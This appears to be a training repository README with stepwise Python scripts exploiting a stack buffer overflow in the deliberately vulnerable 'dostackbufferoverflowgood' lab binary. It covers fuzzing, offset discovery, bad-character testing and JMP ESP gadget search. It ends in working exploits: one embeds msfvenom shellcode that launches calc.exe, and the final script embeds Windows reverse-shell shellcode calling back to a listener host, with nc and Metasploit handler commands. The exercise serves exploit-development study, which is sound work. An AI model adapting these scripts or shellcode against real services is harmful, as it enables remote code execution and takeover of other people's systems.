# dbofg_scripts
Script for dostackbufferoverflowgood.

# dostackbufferoverflowgood

## 1-bof-conn-test.py
```
#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "Python Script"
buf += "\n"

# send message down the socket.
s.send(buf)

# print out what we sent.
print("Sent: {0}".format(buf))

# receive some data from the socket.
data = s.recv(1024)

# print out what we received.
print("Received: {0}".format(data))
```

## 2-bof-fuzz.py
```
#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * 1024
buf += "\n"

# send message down the socket.
s.send(buf)
```

## Create pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024
```

## 3-bof-offset.py
```
#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += offset
buf += "\n"

# send message down the socket.
s.send(buf)
```

## Calculate offset
Take the EIP from the last command (39654138) and run:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
```
Result = 146

OR

```
!mona findmsp
```
Result = EIP contains normal pattern : 0x39654138 (offset 146)

## 4-bof-confirm-offset.py
```
#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += "BBBB"							# SRP overwrite
buf += "CCCC"							# ESP should end up pointing here
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
```

## 5-bof-badchars.py
```
#!/usr/bin/env python2
import socket

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
badchar_test = ""		# start with an empty string
badchars = [0x00, 0x0A]	# we've reasoned that these are definitely bad

# generate the sting
for i in range(0x00, 0xFF + 1):		# range(0x00, 0xFF) only returns up to 0xFE
  if i not in badchars:				# skip the badchars
    badchar_test += chr(i)			# append each non-badchar char to the string

# open a file for writing ("w") the string as a binary ("b") data
with open("badchar_test.bin", "wb") as f:
  f.write(badchar_test)

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += "BBBB"							# SRP overwrite
buf += badchar_test						# ESP points here
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
```

## View badchar_test.bin using xxd (command-line hex viewer)
```
xxd badchar_test.bin
```

## Start python http server to download badchar_test.bin to win10-victim
```
python3 -m http.server 8080
```

## Use mona.py to compare badchar_test.bin to binary copy on disk
```
!mona compare -a esp -f C:\badchar_test.bin
```

## Find "JMP ESP" gadgets
```
!mona jmp -r esp -cpb "\x00\x0A"
```
Result = ```[+] Results :
080414C3     0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\hacking\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
080416BF     0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\hacking\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
0BADF00D       Found a total of 2 pointers```

## 6-bof-poc-exploit.py
```
#!/usr/bin/env python2
import socket
import struct

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
ptr_jmp_esp = 0x080414c3

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += "\xCC\xCC\xCC\xCC"				# ESP should end up pointing here
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
```

## Generate shellcode to pop calc
```
msfvenom -p windows/exec -b '\x00\x0A' \-f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
```

## Lazy way to mitigate damage caused by GetPC
Add NOP sled in front of the encoded shellcode.
Magic number of NOPs needed is 12.

## Right way to mitigate damage caused by GetPC
```
/usr/share/metasploit-framework/tools/exploit/metasm_shell.rb
```
```
sub esp,0x10
```
Result = ```"\x83\xec\x10"```

This will "drag" ESP far away enough up the stack to avoid issue caused by GetPC.

## 7-bof-pop-calc-exploit.py
```
#!/usr/bin/env python2
import socket
import struct

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
ptr_jmp_esp = 0x080414c3
sub_esp_10 = "\x83\xec\x10"

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Shellcode
shellcode_calc =  b""
shellcode_calc += b"\xbb\x55\xbc\xba\xbf\xdb\xc8\xd9\x74\x24"
shellcode_calc += b"\xf4\x5a\x29\xc9\xb1\x31\x31\x5a\x13\x83"
shellcode_calc += b"\xc2\x04\x03\x5a\x5a\x5e\x4f\x43\x8c\x1c"
shellcode_calc += b"\xb0\xbc\x4c\x41\x38\x59\x7d\x41\x5e\x29"
shellcode_calc += b"\x2d\x71\x14\x7f\xc1\xfa\x78\x94\x52\x8e"
shellcode_calc += b"\x54\x9b\xd3\x25\x83\x92\xe4\x16\xf7\xb5"
shellcode_calc += b"\x66\x65\x24\x16\x57\xa6\x39\x57\x90\xdb"
shellcode_calc += b"\xb0\x05\x49\x97\x67\xba\xfe\xed\xbb\x31"
shellcode_calc += b"\x4c\xe3\xbb\xa6\x04\x02\xed\x78\x1f\x5d"
shellcode_calc += b"\x2d\x7a\xcc\xd5\x64\x64\x11\xd3\x3f\x1f"
shellcode_calc += b"\xe1\xaf\xc1\xc9\x38\x4f\x6d\x34\xf5\xa2"
shellcode_calc += b"\x6f\x70\x31\x5d\x1a\x88\x42\xe0\x1d\x4f"
shellcode_calc += b"\x39\x3e\xab\x54\x99\xb5\x0b\xb1\x18\x19"
shellcode_calc += b"\xcd\x32\x16\xd6\x99\x1d\x3a\xe9\x4e\x16"
shellcode_calc += b"\x46\x62\x71\xf9\xcf\x30\x56\xdd\x94\xe3"
shellcode_calc += b"\xf7\x44\x70\x45\x07\x96\xdb\x3a\xad\xdc"
shellcode_calc += b"\xf1\x2f\xdc\xbe\x9f\xae\x52\xc5\xed\xb1"
shellcode_calc += b"\x6c\xc6\x41\xda\x5d\x4d\x0e\x9d\x61\x84"
shellcode_calc += b"\x6b\x41\x80\x0d\x81\xea\x1d\xc4\x28\x77"
shellcode_calc += b"\x9e\x32\x6e\x8e\x1d\xb7\x0e\x75\x3d\xb2"
shellcode_calc += b"\x0b\x31\xf9\x2e\x61\x2a\x6c\x51\xd6\x4b"
shellcode_calc += b"\xa5\x32\xb9\xdf\x25\x9b\x5c\x58\xcf\xe3"

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += sub_esp_10						# ESP points here
buf += shellcode_calc
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
```

## Generate shellcode for shell_reverse_tcp
```
msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' \-f python --var-name shellcode_rs LHOST=192.168.86.57 LPORT=1234
```

## Setup nc listener or exploit/multi/handler
```
nc -nlvp 1234
```

OR

```
$ msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

[*] Started reverse handler on 192.168.1.123:4444
[*] Starting the payload handler...
```
==Was not able to capture shell with exploit/multi/handler.==
==I get the following:==
```
*] Meterpreter session 1 opened (192.168.86.57:1234 -> 192.168.86.55:51177) at 2021-03-13 01:17:58 -0800
dir
[-] Meterpreter session 1 is not valid and will be closed
[*] 192.168.86.55 - Meterpreter session 1 closed.
```
==Need to dig into this more.==

## 8-bof-reverse-shell-exploit-nc.py
```
#!/usr/bin/env python2
import socket
import struct

# set up IP and PORT we are connecting to.
RHOST = "192.168.86.55"
RPORT = 31337

# variables
buf_totlen = 1024
offset_srp = 146
ptr_jmp_esp = 0x080414c3
sub_esp_10 = "\x83\xec\x10"

# create a TCP connection (socket).
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# Shellcode
shellcode_rs =  b""
shellcode_rs += b"\xda\xd9\xbf\xe0\x09\x91\x1b\xd9\x74\x24"
shellcode_rs += b"\xf4\x5e\x29\xc9\xb1\x52\x31\x7e\x17\x03"
shellcode_rs += b"\x7e\x17\x83\x0e\xf5\x73\xee\x32\xee\xf6"
shellcode_rs += b"\x11\xca\xef\x96\x98\x2f\xde\x96\xff\x24"
shellcode_rs += b"\x71\x27\x8b\x68\x7e\xcc\xd9\x98\xf5\xa0"
shellcode_rs += b"\xf5\xaf\xbe\x0f\x20\x9e\x3f\x23\x10\x81"
shellcode_rs += b"\xc3\x3e\x45\x61\xfd\xf0\x98\x60\x3a\xec"
shellcode_rs += b"\x51\x30\x93\x7a\xc7\xa4\x90\x37\xd4\x4f"
shellcode_rs += b"\xea\xd6\x5c\xac\xbb\xd9\x4d\x63\xb7\x83"
shellcode_rs += b"\x4d\x82\x14\xb8\xc7\x9c\x79\x85\x9e\x17"
shellcode_rs += b"\x49\x71\x21\xf1\x83\x7a\x8e\x3c\x2c\x89"
shellcode_rs += b"\xce\x79\x8b\x72\xa5\x73\xef\x0f\xbe\x40"
shellcode_rs += b"\x8d\xcb\x4b\x52\x35\x9f\xec\xbe\xc7\x4c"
shellcode_rs += b"\x6a\x35\xcb\x39\xf8\x11\xc8\xbc\x2d\x2a"
shellcode_rs += b"\xf4\x35\xd0\xfc\x7c\x0d\xf7\xd8\x25\xd5"
shellcode_rs += b"\x96\x79\x80\xb8\xa7\x99\x6b\x64\x02\xd2"
shellcode_rs += b"\x86\x71\x3f\xb9\xce\xb6\x72\x41\x0f\xd1"
shellcode_rs += b"\x05\x32\x3d\x7e\xbe\xdc\x0d\xf7\x18\x1b"
shellcode_rs += b"\x71\x22\xdc\xb3\x8c\xcd\x1d\x9a\x4a\x99"
shellcode_rs += b"\x4d\xb4\x7b\xa2\x05\x44\x83\x77\x89\x14"
shellcode_rs += b"\x2b\x28\x6a\xc4\x8b\x98\x02\x0e\x04\xc6"
shellcode_rs += b"\x33\x31\xce\x6f\xd9\xc8\x99\x4f\xb6\x84"
shellcode_rs += b"\x60\x38\xc5\x28\x97\x6a\x40\xce\xfd\x9a"
shellcode_rs += b"\x05\x59\x6a\x02\x0c\x11\x0b\xcb\x9a\x5c"
shellcode_rs += b"\x0b\x47\x29\xa1\xc2\xa0\x44\xb1\xb3\x40"
shellcode_rs += b"\x13\xeb\x12\x5e\x89\x83\xf9\xcd\x56\x53"
shellcode_rs += b"\x77\xee\xc0\x04\xd0\xc0\x18\xc0\xcc\x7b"
shellcode_rs += b"\xb3\xf6\x0c\x1d\xfc\xb2\xca\xde\x03\x3b"
shellcode_rs += b"\x9e\x5b\x20\x2b\x66\x63\x6c\x1f\x36\x32"
shellcode_rs += b"\x3a\xc9\xf0\xec\x8c\xa3\xaa\x43\x47\x23"
shellcode_rs += b"\x2a\xa8\x58\x35\x33\xe5\x2e\xd9\x82\x50"
shellcode_rs += b"\x77\xe6\x2b\x35\x7f\x9f\x51\xa5\x80\x4a"
shellcode_rs += b"\xd2\xd5\xca\xd6\x73\x7e\x93\x83\xc1\xe3"
shellcode_rs += b"\x24\x7e\x05\x1a\xa7\x8a\xf6\xd9\xb7\xff"
shellcode_rs += b"\xf3\xa6\x7f\xec\x89\xb7\x15\x12\x3d\xb7"
shellcode_rs += b"\x3f"

# build a message followed by a newline.
buf = ""
buf += "A" * (offset_srp - len(buf))	# padding
buf += struct.pack("<I", ptr_jmp_esp)	# SRP overwrite
buf += sub_esp_10						# ESP points here
buf += shellcode_rs
buf += "D" * (buf_totlen - len(buf))	# trailing padding
buf += "\n"

# send message down the socket.
s.send(buf)
```
